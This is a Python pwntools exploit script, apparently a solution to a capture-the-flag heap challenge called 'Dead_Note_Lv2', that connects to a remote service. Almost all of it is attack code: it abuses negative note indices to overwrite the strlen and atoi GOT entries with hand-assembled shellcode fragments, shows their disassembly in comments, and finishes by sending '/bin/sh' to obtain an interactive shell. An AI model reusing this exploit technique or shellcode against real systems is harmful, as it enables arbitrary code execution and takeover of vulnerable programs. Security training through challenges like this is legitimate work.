from pwn import * 
sh = process("./Dead_Note_Lv2")
sh = remote("bksec.team", 4327)
def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def debug(bp):
    #bp = [0xea0,0xd31,0xc52]
    #bp = [0x00000dfb,0x00000b7c,0x00000d10]
    script = ""
    PIE = get_PIE(sh)
    PAPA = PIE
    print hex(PIE + 0x202018)       # free 
    print hex(PIE + 0x2020E0)       # node 
    # script += "x/gx 0x%x\n"%(PIE + 0x202018) 
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    
    gdb.attach(sh,gdbscript=script) 

def add(id, count, content) : 
    sh.recv() 
    sh.sendline("1") 
    sh.recv() 
    sh.sendline(str(id)) 
    sh.recv() 
    sh.sendline(str(count)) 
    sh.recv() 
    sh.send(content)         

def add_shell(id, count, content) : 
    sh.recv() 
    sh.sendline("1") 
    sh.recv() 
    sh.sendline(str(id)) 
    sh.recv() 
    sh.sendline(str(count)) 
    sh.recv() 
    jmp = "\xEB" 
    jmp += chr(30 -len(content))   
    sh.send(content + jmp)     

def free(id) : 
    sh.recv() 
    sh.sendline("2") 
    sh.recv() 
    sh.sendline(str(id)) 
 
add(0, 606, "A")
add(606, 1, "A") 
add(607, 1, "A")
add(608, 1, "\x58\x75\x36") 
add(609, 1, "CCC")
free(606)   

add(-23, 1, "\x53\x75\x3d")         # overwrite : strlen jne $+0x39 -> c3 
#debug([0x100C, 0xE7D, 0xD44])  
""" 
\x53\x75\x30 
push rbx 
jne $ + 0x32
\x58\x75\x37
pop rax 
jne $+-x39
""" 

add(-23, 1, "\x31\xc0\xc3")                                 # overwrite strlen 
add(-14, 1, "\x50\x5A\x50\x5E\x34\x3B\x0F\x05")             # overwrite atoi -> heap

"""
0:  50                      push   rax
1:  5a                      pop    rdx
2:  50                      push   rax
3:  5e                      pop    rsi
4:  34 3b                   xor    al,0x3b
6:  0f 05                   syscall
"""
print sh.recv() 
sh.send("/bin/sh")



sh.interactive()